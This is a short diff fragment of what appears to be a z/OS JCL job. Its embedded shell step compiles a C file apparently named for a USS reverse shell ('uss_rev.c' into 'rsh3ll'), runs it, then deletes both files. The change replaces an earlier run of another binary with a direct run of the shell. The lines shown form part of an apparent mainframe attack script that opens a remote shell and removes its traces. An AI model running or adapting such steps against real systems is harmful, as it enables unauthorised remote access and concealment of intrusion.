@@ -41,8 +41,7 @@ return EXIT_SUCCESS;
 //STDPARM   DD *
 SH cd /tmp;
 cc -o /tmp/rsh3ll /tmp/uss_rev.c;
-chmod +x /tmp/cJqN;
-/tmp/cJqN;
+/tmp/rsh3ll;
 rm /tmp/rsh3ll;
 rm /tmp/uss_rev.c;
 /*
